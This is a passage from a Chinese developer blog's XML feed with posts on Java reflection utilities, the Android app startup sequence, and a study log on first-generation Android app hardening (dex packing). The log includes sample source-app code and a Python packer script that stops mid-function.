//反射获取Class类对象            Method method = clazz.getMethod(method_name,parameterTypes);//反射获取方法            method.setAccessible(true);//突破权限访问控制            return method.invoke(null,parameterValues);//反射调用,静态方法无需指定所属实例,直接传参即可        &#125;catch (Exception e)&#123;            Log.d(TAG, e.toString());            return null;        &#125;    &#125;     public static Object invokeMethod(String class_name,String method_name,Object obj,Class&lt;?&gt;[] parameterTypes,Object[] parameterValues)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Method method = clazz.getMethod(method_name,parameterTypes);            method.setAccessible(true);//突破权限访问控制            return method.invoke(obj,parameterValues);// 反射调用,动态方法需要指定所属实例        &#125;catch (Exception e)        &#123;            Log.d(TAG, e.toString());            return null;        &#125;    &#125;     public static Object getField(String class_name,Object obj,String field_name)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Field field = clazz.getDeclaredField(field_name);            field.setAccessible(true);            return field.get(obj);  //获取实例字段,需要指定实例对象        &#125;catch(Exception e)        &#123;            Log.d(TAG, e.toString());            return null;        &#125;    &#125;     public static Object getStaticField(String class_name,String field_name)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Field field = clazz.getDeclaredField(field_name);            field.setAccessible(true);            return field.get(null);        &#125;catch (Exception e)        &#123;            Log.d(TAG, e.toString());            return null;        &#125;    &#125;     public static void setField(String class_name,String field_name,Object obj,Object value)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Field field = clazz.getDeclaredField(field_name);            field.setAccessible(true);            field.set(obj,value);        &#125;catch (Exception e)        &#123;            Log.d(TAG, e.toString());        &#125;    &#125;     public static void setStaticField(String class_name,String field_name,Object value)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Field field = clazz.getDeclaredField(field_name);            field.setAccessible(true);            field.set(null,value);        &#125;catch (Exception e)&#123;            Log.d(TAG, e.toString());        &#125;    &#125;&#125;</code></pre><h3 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h3><p>大佬文章<br>[<a href="https://bbs.kanxue.com/thread-286929.htm">原创]Android从整体加固到抽取加固的实现及原理-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Java学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 应用启动流程</title>
      <link href="/2025/08/19/Android%20%E5%BA%94%E7%94%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
      <url>/2025/08/19/Android%20%E5%BA%94%E7%94%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Android-应用启动流程"><a href="#Android-应用启动流程" class="headerlink" title="Android 应用启动流程"></a>Android 应用启动流程</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>最近开始接触 Android APP 加固，涉及到 Android APP 启动流程，之前也没有较为系统的了解过，故记录一下。</p><h3 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h3><p>源自看雪的一篇<a href="https://bbs.kanxue.com/thread-284686.htm">文章</a>，但篇文章中并没有文字解释。</p><pre><code class="language-ASN.1">┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐第一阶段：Launcher 处理Launcher.startActivity()↓ActivityTaskManager.startActivity()↓ (Binder 跨进程)ActivityManagerService.startActivity()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐第二阶段：进程创建Process.start()↓ZygoteProcess.start()↓Zygote.fork()↓ActivityThread.main()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐第三阶段：SO 加载LoadedApk.loadLibrary()↓System.loadLibrary()↓Runtime.loadLibrary0()↓DexPathList.findLibrary()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐第四阶段：DEX 加载PathClassLoader.loadClass()↓BaseDexClassLoader.loadClass()↓DexPathList.findClass()↓DexFile.loadClassBinaryName()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐第五阶段：Application 创建LoadedApk.makeApplication()↓Instrumentation.newApplication()↓Application.attach()↓Application.onCreate()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐第六阶段：Activity 启动ActivityThread.handleLaunchActivity()↓ActivityThread.performLaunchActivity()↓Instrumentation.newActivity()↓Activity.onCreate()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐第七阶段：视图绘制Activity.setContentView()↓PhoneWindow.setContentView()↓LayoutInflater.inflate()↓ViewRootImpl.performTraversals()↓measure() → layout() → draw()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘</code></pre><p>下面是文字解释：</p><h4 id="第一阶段：Launcher-处理"><a href="#第一阶段：Launcher-处理" class="headerlink" title="第一阶段：Launcher 处理"></a>第一阶段：Launcher 处理</h4><ul><li>当用户点击桌面图标时，Launcher 调用 <code>startActivity()</code>。</li><li>经过 <code>ActivityTaskManager.startActivity()</code>，最终跨进程调用到系统服务 <code>ActivityManagerService.startActivity()</code>（AMS）。</li><li>AMS 是 Android 应用组件的调度中心，负责决定是否需要新建进程、是否复用已有进程，并开始应用的启动流程。</li></ul><h4 id="第二阶段：进程创建"><a href="#第二阶段：进程创建" class="headerlink" title="第二阶段：进程创建"></a>第二阶段：进程创建</h4><ul><li>如果应用进程尚未存在，AMS 会调用 <code>Process.start()</code>。</li><li>内部通过 <code>ZygoteProcess.start()</code> 与 <strong>Zygote</strong> 进程通信，请求孵化新进程。</li><li><strong>Zygote</strong> 作为系统中预加载了运行时和框架类的进程，会调用 <code>fork()</code> 复制出一个新的应用进程。</li><li>新进程启动后执行 <code>ActivityThread.main()</code>，这是应用 Java 世界的入口点，启动主线程（UI 线程）的 Looper 消息循环。</li><li>通过 <code>ActivityManagerService.attachApplication()</code> 把自己注册到 AMS，告诉系统“我进程起来了，可以调度应用逻辑了”。</li></ul><h4 id="第三阶段：SO-库加载"><a href="#第三阶段：SO-库加载" class="headerlink" title="第三阶段：SO 库加载"></a>第三阶段：SO 库加载</h4><ul><li>在应用初始化过程中，如果代码里调用了 <code>System.loadLibrary()</code> 来使用 JNI，本阶段负责加载本地 <code>.so</code> 动态库。</li><li>调用链路是：<br> <code>LoadedApk.loadLibrary()</code> → <code>System.loadLibrary()</code> → <code>Runtime.loadLibrary0()</code> → <code>DexPathList.findLibrary()</code>。</li><li>最终会定位到 APK 内的 <code>lib/</code> 目录或系统库路径，将目标 <code>.so</code> 文件映射到进程空间。</li></ul><h4 id="第四阶段：DEX-加载"><a href="#第四阶段：DEX-加载" class="headerlink" title="第四阶段：DEX 加载"></a>第四阶段：DEX 加载</h4><ul><li>应用的 Java 代码存在于 <code>classes.dex</code> 中，需要被类加载器解析。</li><li>加载流程是：<br> <code>PathClassLoader.loadClass()</code> → <code>BaseDexClassLoader.loadClass()</code> → <code>DexPathList.findClass()</code> → <code>DexFile.loadClassBinaryName()</code>。</li><li>这一步负责把 <code>.dex</code> 文件里的字节码转换为虚拟机可执行的类对象（Class），并缓存到内存中。</li></ul><h4 id="第五阶段：Application-创建"><a href="#第五阶段：Application-创建" class="headerlink" title="第五阶段：Application 创建"></a>第五阶段：Application 创建</h4><ul><li>系统通过 <code>LoadedApk.makeApplication()</code> 创建应用的 <code>Application</code> 实例。</li><li>流程：<code>Instrumentation.newApplication()</code> → 调用 <code>Application.attach()</code> → 调用 <code>Application.onCreate()</code>。</li><li><strong>注意</strong>：<code>Application.attachBaseContext()</code> 会在 <code>onCreate()</code> 之前调用，这是应用最早可以执行自定义代码的时机。很多“壳代码”或框架初始化逻辑都插在这里。</li></ul><h4 id="第六阶段：Activity-启动"><a href="#第六阶段：Activity-启动" class="headerlink" title="第六阶段：Activity 启动"></a>第六阶段：Activity 启动</h4><ul><li>AMS 调用 <code>ActivityThread.handleLaunchActivity()</code>，通知应用进程启动目标 Activity。</li><li>内部调用 <code>performLaunchActivity()</code>：</li></ul><p>​        通过 <code>Instrumentation.newActivity()</code> 创建 Activity 实例。</p><p>​        调用 <code>Activity.attach()</code> 绑定上下文和 Window。</p><p>​        调用生命周期方法 <code>Activity.onCreate()</code>，开始执行开发者写的逻辑。</p><h4 id="第七阶段：视图绘制"><a href="#第七阶段：视图绘制" class="headerlink" title="第七阶段：视图绘制"></a>第七阶段：视图绘制</h4><ul><li>在 Activity 的 <code>onCreate()</code> 中调用 <code>setContentView()</code> 设置布局。</li><li>流程：<code>Activity.setContentView()</code> → <code>PhoneWindow.setContentView()</code> → <code>LayoutInflater.inflate()</code> 解析 XML → 生成 View 树。</li><li>之后由 <code>ViewRootImpl.performTraversals()</code> 触发三大绘制流程：</li></ul><ol><li><strong>measure()</strong> → 测量每个 View 的尺寸。</li><li><strong>layout()</strong> → 确定每个 View 的位置。</li><li><strong>draw()</strong> → 绘制到屏幕。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓加固学习记录</title>
      <link href="/2025/08/19/%E5%AE%89%E5%8D%93%E5%8A%A0%E5%9B%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/08/19/%E5%AE%89%E5%8D%93%E5%8A%A0%E5%9B%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="安卓加固学习记录"><a href="#安卓加固学习记录" class="headerlink" title="安卓加固学习记录"></a>安卓加固学习记录</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​        近期开始接触公司的加固业务——Android App 加固，由于之前在 CTF 中遇到的加固一是少，二是都不难，frida-dump 基本都能秒，所以也没有较为系统的去学习了解安卓加固这一块。所以在看雪上找了一些较为详细的文章进行学习并记录，同时也会补充一些个人的理解或者在原文章中讲的不那么详细的点加以补充。</p><h3 id="二、第一、二代壳-Dex-整体加固"><a href="#二、第一、二代壳-Dex-整体加固" class="headerlink" title="二、第一、二代壳 Dex 整体加固"></a>二、第一、二代壳 Dex 整体加固</h3><p>​        <strong>第一代壳</strong>主要是对 **dex&#x2F;APK ** 文件整体进行加密，然后使用自定义加载器动态加载 dex&#x2F;APK 文件并执行。而 <strong>动态加载</strong> 又分为 <strong>落地加载</strong> 和 <strong>不落地加载</strong>，落地加载就是通过 <strong>DexClassLoader</strong> 从磁盘加载 dex&#x2F;APK 文件，<strong>不落地加载</strong> 就是通过 <strong>InMemoryDexClassLoader</strong> 从内存中加载 dex&#x2F;APK 文件。</p><p>​        这里解释一下上面提到的 <strong>磁盘</strong> 和 <strong>内存</strong> 分别的含义，磁盘指的是 <strong>Android 文件系统上的存储空间</strong>，通常是应用的私有存储目录（<code>/data/data/&lt;package&gt;/</code> 下），或者外部存储卡路径，使用 <strong>DexClassLoader</strong> 时，需要先把 .dex 或 .apk 文件以真实文件形式存放在磁盘上，然后 DexClassLoader 会通过文件路径去读取和加载字节码，故称之为 <strong>落地</strong>；<strong>内存</strong> 指的是 <strong>进程的堆内存（RAM）</strong>，即由 Java 代码直接持有的 <strong>ByteBuffer</strong> 或 byte[]，使用 <strong>InMemoryDexClassLoader</strong> 时，不需要在磁盘上生成 .dex 文件，而是可以直接把字节码存放在内存（通常是通过网络下载的字节流、解密后的字节数组、或 mmap 的 buffer），然后直接传给 InMemoryDexClassLoader 来加载，这样，整个过程中不会在磁盘中产生持久化的 dex 文件，故称之为 <strong>不落地</strong>。</p><h4 id="Dex-文件结构"><a href="#Dex-文件结构" class="headerlink" title="Dex 文件结构"></a>Dex 文件结构</h4><p>借用文章里的图<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250819103114984.png" alt="image-20250819103114984"></p><h4 id="一代壳实现原理"><a href="#一代壳实现原理" class="headerlink" title="一代壳实现原理"></a>一代壳实现原理</h4><p><strong>App 的启动流程</strong><br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250819103443269.png" alt="image-20250819103443269"></p><p>​        通过将原 APK 进行加密后保存在加壳 APK 的 dex 文件尾部，在加壳 APK 运行时将 dex 文件尾部加密的原 APK 文件解密后进行动态加载。（这里提到的加壳 APK 也确实是一个真正的 APK 文件，包含完整的 APK 文件结构，但是并无业务代码，而是 <strong>负责加载、解密、再运行真正的原始 APK</strong>）。</p><p>​        壳代码需要最早回去到 加壳APK 的执行时机，所以 加壳APK 的 Application 实现了 <strong>attachContextApplication</strong> 函数，此函数在 <strong>handleBindApplication</strong> 函数中通过调用 <strong>makeApplication</strong> 进行调用，是一个 APP 进程最早的执行入口。（有关 Android 应用启动流程可以看这篇<a href="https://nshide1.github.io/2025/08/19/Android%20%E5%BA%94%E7%94%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/">文章</a>）。</p><p>​        加壳 APK 需要进行如下操作：</p><ul><li><strong>attachContextApplication</strong> 解密原 APK 保存到磁盘文件中（不落地加载可以不保存磁盘文件），动态加载解密后的 APK 并替换掉 <strong>mClassLoader</strong>。</li><li><strong>Application::onCreate</strong> 重定位 Application，调用原 APK 的 Application 的 onCreate 函数。</li></ul><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250819112238763.png" alt="image-20250819112238763"></p><p>这里再补充解释一下 <strong>mClassLoader</strong> 和 <strong>Application::onCreate</strong>：</p><ul><li><strong>mClassLoader</strong> 是 <strong>Android 系统内部  LoadedApk  对象的一个字段</strong>，它表示这个 APK 对应的 <strong>类加载器（ClassLoader）</strong>；在 Android 中，每个 APK 都有一个 LoadedApk 对象，里面包含：APK 的路径、资源（Resources）、类加载器（ClassLoader）–&gt; mClassLoader；<strong>功能</strong>：系统通过 mClassLoader 去加载 APK 里的类（Java&#x2F;DEX 类），包括 Activity、Service、Application 等，默认情况下，mClassLoader 是 <strong>PathClassLoader</strong>，加载 APK 自带的 dex 文件。</li><li><strong>Application::onCreate()</strong> 是 <strong>Application 生命周期的第一个回调函数</strong>，在 <strong>attach()</strong> 后调用；<strong>功能</strong>：执行全局初始化逻辑，例如，初始化 SDK、设置全局单例、加载配置，这是应用在启动时的“第一个执行点”，比任何 Activity 的 <code>onCreate()</code> 都早。</li></ul><h4 id="一代壳-整体加固（落地加载）"><a href="#一代壳-整体加固（落地加载）" class="headerlink" title="一代壳-整体加固（落地加载）"></a>一代壳-整体加固（落地加载）</h4><p>​        一代加固是所有加固的基础，了解一代加固的基本思路有助于理解后续加固技术的演进。</p><p><strong>原理</strong>：</p><p>主要涉及三个对象：</p><pre><code>1. 待加固的源程序APK；1. （脱）壳程序APK 负责加载，解密和执行被保护的源程序；1. 加壳程序 负责解析源程序并利用壳程序对其进行加固保护，将壳程序和源程序合并为新的程序。</code></pre><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820151911526.png" alt="image-20250820151911526"></h4><p>加壳后的 壳 Dex 文件示意图如下：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820152435521.png" alt="image-20250820152435521"></p><p>最终新 APK 中包括以下内容：</p><pre><code>1. 修改过的 AndroidManifest.xml；1. 由壳 Dex 和 源 APK 合并而来的 class.dex；1. 源 APK 的所有其他资源文件（包括 lib、assets、resources 等）。</code></pre><p>（脱）壳程序：</p><pre><code>1. 在壳程序 dex 末尾追加源程序的所有 dex；1. 在壳程序 Application 的 **attachBaseContext** 方法释放源程序所有 dex 并替换 mClassLoader；1. 在壳程序 Application 的 onCreate 方法注册源程序 Application 并开始生命周期。</code></pre><h5 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h5><p>​        源程序即一般的用户程序，我们的主要目的是对源程序进行加固保护，所以需要注意源程序可能涉及到的技术点：</p><ul><li>源程序自定义 Application</li></ul><p>​        Application.attachBaseContext 是 APP 进程真正的入口点。如果源程序没有使用自定义Application，则可以直接复用壳程序 Application；如果源程序有自定义Application，则一定要在 AndroidManifest.xml 文件中 由  <application android:name=""> 标签声明指定，可以替换属性值为<strong>壳 application</strong>，同时添加 <strong>meta-data 标签</strong>保存<strong>源程序application</strong>。</p><ul><li>Native</li></ul><p>​        源程序使用NDK开发时会生成lib文件夹和对应so文件，需要进行处理；主要是创建lib库的释放文件夹，提供给新的 ClassLoader。</p><p>源程序主要包括以下文件：</p><pre><code>1. MainActivity.java2. MyApplication.java3. native-lib.cpp4. AndroidManifest.xml5. activity_main.xml</code></pre><p><strong>注意关闭Multidex支持,保证只编译出一个Dex文件</strong></p><h6 id="MainActivity-java"><a href="#MainActivity-java" class="headerlink" title="MainActivity.java"></a>MainActivity.java</h6><p>主要功能：</p><pre><code>1. Java 层组件 TextView1. Native 层 JNI 函数调用</code></pre><p>注意点：</p><pre><code>1. MainActivity 继承自 **Activity 类**而非 AppCompatActivity，这一步是为了方便资源处理；1. 使用到了 native 函数，所以要处理 lib 文件夹；1. 关闭 MultiDex 支持，只生成一个 dex 文件便于处理。</code></pre><pre><code class="language-java">package com.example.sourcecodeforshell1;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;import android.widget.TextView;import com.example.sourcecodeforshell1.databinding.ActivityMainBinding;public class MainActivity extends AppCompatActivity &#123;        static &#123;        System.loadLibrary(&quot;sourcecodeforshell1&quot;);    &#125;    @Override    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        String hint = stringFromJNI();                TextView tv = (TextView) findViewById(R.id.sample_text);        tv.setText(hint);        Log.d(&quot;NshIdE&quot;, &quot;Run source MainActivity.onCreate &quot; + this);    &#125;        public native String stringFromJNI();&#125;</code></pre><h6 id="MyApplication-java"><a href="#MyApplication-java" class="headerlink" title="MyApplication.java"></a>MyApplication.java</h6><p>主要功能：log 输出便于定位执行流程</p><p>注意：</p><pre><code>1. 程序执行的顺序为 Application.attachBaseContext --&gt; Application.onCreate() --&gt; MainActivity.onCreate()；2. 该类主要用于模拟存在自定义 Application 的情况。如果源程序不存在自定义 Application 3. 使用默认的 Application 即可，否则需要解析 Application 并进行创建和替换。</code></pre><pre><code class="language-Java">package com.example.sourcecodeforshell1;import android.app.Application;import android.content.Context;import android.util.Log;public class MyApplication extends Application &#123;        @Override    protected void attachBaseContext(Context base) &#123;        super.attachBaseContext(base);        Log.d(&quot;NshIdE&quot;, &quot;Run source MyApplication.attachBaseContext &quot; + this);    &#125;        @Override    public void onCreate() &#123;        super.onCreate();        Log.d(&quot;NshIdE&quot;, &quot;Run source MyApplication.onCreate &quot; + this);    &#125;    &#125;</code></pre><h6 id="native-lib-cpp"><a href="#native-lib-cpp" class="headerlink" title="native-lib.cpp"></a>native-lib.cpp</h6><p>定义了静态注册的方法 stringFromJNI</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_sourcecodeforshell1_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    std::string hello = &quot;Hello from C++&quot;;    return env-&gt;NewStringUTF(hello.c_str());&#125;</code></pre><h6 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h6><p>主要功能：</p><pre><code>1. 指定根 activity 为 MainActivity1. 指定 android:name 为 MyApplication</code></pre><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt;    &lt;application        android:allowBackup=&quot;true&quot;        android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot;        android:fullBackupContent=&quot;@xml/backup_rules&quot;        android:icon=&quot;@mipmap/ic_launcher&quot;        android:label=&quot;@string/app_name&quot;        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;        android:supportsRtl=&quot;true&quot;        android:theme=&quot;@style/Theme.SourceCodeForShell1&quot;        android:name=&quot;.MyApplication&quot;&gt;        &lt;activity            android:name=&quot;.MainActivity&quot;            android:exported=&quot;true&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><h6 id="activity-main-xml"><a href="#activity-main-xml" class="headerlink" title="activity_main.xml"></a>activity_main.xml</h6><p>这个就没改动了，就是 Android studio 默认初始化的</p><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    tools:context=&quot;.MainActivity&quot;&gt;    &lt;TextView        android:id=&quot;@+id/sample_text&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:text=&quot;Hello World!&quot;        app:layout_constraintBottom_toBottomOf=&quot;parent&quot;        app:layout_constraintEnd_toEndOf=&quot;parent&quot;        app:layout_constraintStart_toStartOf=&quot;parent&quot;        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;</code></pre><p>以上就是源程序。</p><h5 id="加壳程序"><a href="#加壳程序" class="headerlink" title="加壳程序"></a>加壳程序</h5><p>加壳程序主要需要完成以下工作：</p><ol><li>解包 壳程序和源程序。得到<strong>壳程序</strong>的 dex 以及<strong>源程序</strong>的 AndroidManifest.xml 和资源文件等；</li><li>复制源程序解包后的文件到新 APK 临时目录（忽略部分文件）；</li><li>处理源程序 AndroidManifest.xml 写入新 APK 临时目录。判断是否存在 application 标签的 name 属性指定了<strong>自定义的 Application</strong>，若存在则添加 meta-data 标签保存原始 application，无论是否存在都要指定 name 值为壳的 Application；</li><li>合并壳 dex 和源程序 APK 写入新 APK 临时目录；</li><li>重打包新的 APK；</li><li>对新 APK 签名</li><li>删除临时目录。</li></ol><h6 id="FirstShell-py"><a href="#FirstShell-py" class="headerlink" title="FirstShell.py"></a>FirstShell.py</h6><ol><li>封装 <strong>Path</strong> 类，保存全局使用到的路径，主要是 APK 路径和临时目录；</li><li>封装 <strong>Apkktool</strong> 类，通过 apktool 提供的 APK 解包和打包功能，通过 uber-apk-signer 提供 apk 签名功能；</li><li>封装 <strong>ManifestEditor</strong> 类，提供 ManifestEditor 解析功能，支持获取和修改标签属性，添加新标签；</li><li><strong>combineShellDexAndSrcApk</strong> 合并壳 dex 和源 APK。将原 APK 加密后填充到 壳 dex 后方，并添加 4 字节标识 APK 大小。故，新 dex &#x3D; 壳dex + 加密后的原 APK + 原 APK 大小；</li><li>handleManifest 处理 AndroidManifest.xml。分别提取原 APK 和壳的 AndroidManifest 文件，以源 manifest 为基准，根据原 APK 是否指定自定义 application 确定是否添加 meta-data 标签保存，最后修改 application:name 为 壳 application；</li><li>start 完整的处理函数。</li></ol><pre><code class="language-python">from zlib import adler32from hashlib import sha1from binascii import unhexlifyfrom lxml import etreeimport subprocessimport shutilfrom pathlib import Pathimport argparse#封装 path 类，保存全局需要用到的路径class Paths:    def __init__(self, srcApk:Path, shellApk:Path, outputApk:Path):        # Apk file paths        self.srcApkPath = srcApk.resolve()  #解析为绝对路径        self.shellApkPath = shellApk.resolve()        self.newApkPath = outputApk.resolve()        # 临时目录路径为python文件路径        self.tmpdir = Path(__file__).parent / &#39;temp&#39;        self.srcApkTempDir = self.tmpdir / &#39;srcApkTemp&#39;        self.shellApkTempDir = self.tmpdir / &#39;shellApkTemp&#39;        self.newApkTempDir = self.tmpdir / &#39;newApkTemp&#39;# ApkTool 类 提供解包，打包，签名功能class Apktool:    def __init__(self):        self.apktool_path = Path(__file__).parent.parent / &#39;tools/apktool/apktool.bat&#39;        self.signer_path = Path(__file__).parent / &#39;tools/uber-apk-signer-1.3.0.jar&#39;    def signApk(self, unsignedApkPath:Path):        self.runCommand([&#39;java&#39;, &#39;-jar&#39;, self.signer_path, &#39;--apk&#39;, unsignedApkPath])    # 使用 aoktool 解包 apk，只解包资源不解包 dex    def extractApk(self, apkPath:Path, outputDir:Path):        self.runCommand([self.apktool_path, &#39;d&#39;, apkPath, &#39;-s&#39;, &#39;-o&#39;, outputDir])    # 重打包 apk    def repackApk(self, inputDir:Path, outApk:Path):        self.runCommand([self.apktool_path, &#39;b&#39;, inputDir, &#39;-o&#39;, outApk])    def runCommand(self, args):        #仅调用工具,不需要输出,重定向stdout到os.devnull        subprocess.run(args, stdout=subprocess.DEVNULL)        #参数列表 捕获输出 输出转为字符串        print(subprocess.run(args, capture_output=True).stdout)# AndroidManifest.xml的editor 用于获取和修改标签属性以及添加标签class ManifestEditor:    def __init__(self, xml_content: bytes):        self.ns = &#123;&#39;android&#39;: &#39;http://schemas.android.com/apk/res/android&#39;&#125;        self.tree = etree.fromstring(xml_content)    #获取指定标签的android属性值 examples: get_attr(&#39;application&#39;, &#39;name&#39;) get_attr(&#39;activity&#39;. &#39;name&#39;)    def getTagAttribute(self, tag_name: str, attr_name: str):        if tag_name == &#39;manifest&#39;:  #根标签特殊处理            elem = self.tree            if elem is not None:                return elem.get(f&#39;&#123;attr_name&#125;&#39;)   # 寻找标签的属性        else:            elem = self.tree.find(f&#39;.//&#123;tag_name&#125;&#39;, namespaces=self.ns)            if elem is not None:                #根标签之外的属性位于Android命名空间下                return elem.get(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;attr_name&#125;&#39;)        return None    #设置指定标签的属性值    #example set_attr(&#39;application&#39;, &#39;name&#39;, &#39;com.example.ProxyApplication&#39;)    def setTagAttribute(self, tag_name: str, attr_name: str, new_value: str):        if tag_name == &#39;manifest&#39;:   #根标签特殊处理            elem = self.tree            if elem is not None:                return elem.set(f&#39;&#123;attr_name&#125;&#39;, new_value)  #设置属性值        else:            elem = self.tree.find(f&#39;.//&#123;tag_name&#125;&#39;, namespaces=self.ns)            if elem is not None:                elem.set(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;attr_name&#125;&#39;, new_value)                return True        return False    # 在指定父标签下添加新子标签    # example: add_tag(&#39;application&#39;,&quot;meta-data&quot;,&#123;&#39;name&#39;: &#39;android.permission.CAMERA&#39;,&#39;value&#39;:&#39;hello&#39;&#125;)    def addTagWithAttribute(self, parent_tag: str, new_tag: str, attrs: dict):        if parent_tag == &#39;manifest&#39;:            parent = self.tree            if parent is not None:                new_elem = etree.SubElement(parent, new_tag)                for k, v in attrs.items(): #支持一次给添加的标签设置多个属性                    new_elem.set(f&#39;&#123;k&#125;&#39;, v)                return True        else:            parent = self.tree.find(f&#39;.//&#123;parent_tag&#125;&#39;, namespaces=self.ns)            if parent is not None:                new_elem = etree.SubElement(parent, new_tag)                for k, v in attrs.items():                    new_elem.set(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;k&#125;&#39;, v)                return True        return False    # 不以壳manifest为基准操作则用不到该函数,以源apk的manifest为基准自带,无需额外设置    def getMainActivity(self):        activities = self.tree.findall(&#39;.//activity&#39;, namespaces=self.ns)        for activity in activities:            intent_filters = activity.findall(&#39;.//intent-filter&#39;, namespaces=self.ns)            for intent_filter in intent_filters:                action = intent_filter.find(&#39;.//action[@android:name=&quot;android.intent.action.MAIN&quot;]&#39;, namespaces=self.ns)                category = intent_filter.find(&#39;.//category[@android:name=&quot;android.intent.category.LAUNCHER&quot;]&#39;,                                              